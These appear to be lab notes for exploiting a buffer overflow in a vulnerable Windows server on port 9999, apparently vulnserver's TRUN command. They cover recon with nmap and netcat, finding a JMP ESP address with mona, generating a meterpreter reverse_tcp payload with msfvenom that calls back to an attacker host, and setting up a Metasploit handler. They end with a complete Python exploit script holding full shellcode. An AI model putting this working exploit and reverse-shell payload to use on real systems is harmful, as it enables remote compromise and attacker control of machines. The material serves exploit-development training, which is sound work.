run executable

nmap box
	nmap -Pn -sT -T4 10.50.21.16 --script=banner

connect to box/interact with program
	to find if their is user interaction
		nc 10.50.21.16 9999

create a socket program
	secureserver.py

attach secureserver to immunity debugger

	run socket program to see how many characters are needed to break it

	run !mona modules
		starts up the mona modules

	run !mona jmp -r esp -m "essfunc.dll"
		finds jmp and esp inside of the essfunc.dll
			copy to clipboard -> address
			msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.34.74 lport 10000 -b "\x00" -f python
				add EIP address, NOOP, and byte code to script 

	student>msfconsole
		msfconsole>use multi/handler
		msfconsole> show options
		msfconsole> set payload windows/meterpreter/reverse_tcp
			msfconcole> set HOST 0.0.0.0
			msfconsole> set lport 10000
			msfconsole> exploit















				####WINDOWS SCRIPT####
#!/usr/bin/python

import socket

buf = "TRUN /.:/"          #Command to be sent
buf += "A" * 2003          #Data to replicate the crash
buf += "B" * 4             #Verification
buf += "\xa0\x12\x50\x62"  #Little endian version of EIP
buf += "\x90" * 15         #NOOP to give room for code


#Shell code added that will allow reverse_tcp
buf += b"\xd9\xc4\xd9\x74\x24\xf4\x5e\x2b\xc9\xba\x67\xd8"
buf += b"\x3a\x1d\xb1\x59\x83\xee\xfc\x31\x56\x15\x03\x56"
buf += b"\x15\x85\x2d\xc6\xf5\xc6\xce\x37\x06\xb8\xff\xe5"
buf += b"\x62\xb3\x52\x3a\xe2\x26\xd9\x68\xf8\x23\x8c\x98"
buf += b"\x0f\x84\x7b\x87\x3e\x15\xf0\xb5\x68\xd8\xc7\x96"
buf += b"\x55\x7b\xb4\xe4\x89\x5b\x85\x26\xdc\x9a\xc2\xf0"
buf += b"\xaa\x73\x9e\x89\x07\x9b\x48\x05\xe5\xa7\x77\xc9"
buf += b"\x61\x97\x0f\x6c\xb5\x63\xbc\x6f\xe6\xdb\xb7\x28"
buf += b"\x26\x50\x8f\xd0\x27\xb5\x95\x28\x53\x05\xa7\x55"
buf += b"\xd5\xfe\xf3\x22\xe7\xd6\xcd\xf4\x44\x17\xe2\xf8"
buf += b"\x95\x50\xc5\xe2\xe3\xaa\x35\x9e\xf3\x69\x47\x44"
buf += b"\x71\x6d\xef\x0f\x21\x49\x11\xc3\xb4\x1a\x1d\xa8"
buf += b"\xb3\x44\x02\x2f\x17\xff\x3e\xa4\x96\x2f\xb7\xfe"
buf += b"\xbc\xeb\x93\xa5\xdd\xaa\x79\x0b\xe1\xac\x26\xf4"
buf += b"\x47\xa7\xc5\xe3\xf8\x48\x16\x0c\xa5\xde\xda\xc1"
buf += b"\x56\x1e\x75\x51\x24\x2c\xda\xc9\xa2\x1c\x93\xd7"
buf += b"\x35\x15\xb3\xe7\xea\x9d\xd4\x19\x0b\xdd\xfd\xdd"
buf += b"\x5f\x8d\x95\xf4\xdf\x46\x66\xf8\x35\xf2\x6c\x6e"
buf += b"\xbc\x30\x64\x7e\xa8\x36\x86\x59\x38\xbf\x60\xf5"
buf += b"\x68\xef\x3c\xb6\xd8\x4f\xed\x5e\x33\x40\xd2\x7f"
buf += b"\x3c\x8b\x7b\x15\xd3\x65\xd3\x82\x4a\x2c\xaf\x33"
buf += b"\x92\xfb\xd5\x74\x18\x09\x29\x3a\xe9\x78\x39\x2b"
buf += b"\x8e\x82\xc1\xac\x3b\x82\xab\xa8\xed\xd5\x43\xb3"
buf += b"\xc8\x11\xcc\x4c\x3f\x22\x0b\xb2\xbe\x12\x67\x85"
buf += b"\x54\x1a\x1f\xea\xb8\x9a\xdf\xbc\xd2\x9a\xb7\x18"
buf += b"\x87\xc9\xa2\x66\x12\x7e\x7f\xf3\x9d\xd6\xd3\x54"
buf += b"\xf6\xd4\x0a\x92\x59\x27\x79\xa0\x9e\xd7\xff\x8f"
buf += b"\x06\xbf\xff\x8f\xb6\x3f\x6a\x10\xe7\x57\x61\x3f"
buf += b"\x08\x97\x8a\xea\x41\xbf\x01\x7b\x23\x5e\x15\x56"
buf += b"\xe5\xfe\x16\x55\x3e\xf1\x6d\x16\xc1\xf2\x91\x3e"
buf += b"\xa6\xf3\x91\x3e\xd8\xc8\x47\x07\xae\x0f\x54\x3c"
buf += b"\xa1\x3a\xf9\x15\x28\x44\xad\x66\x79"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create socket
s.connect(("10.50.21.16",9999)) #Connect to target
print s.recv(1024) #print respose
s.send(buf) #Send the stage
print s.recv(1024) #Print second response
s.close() #Close socket
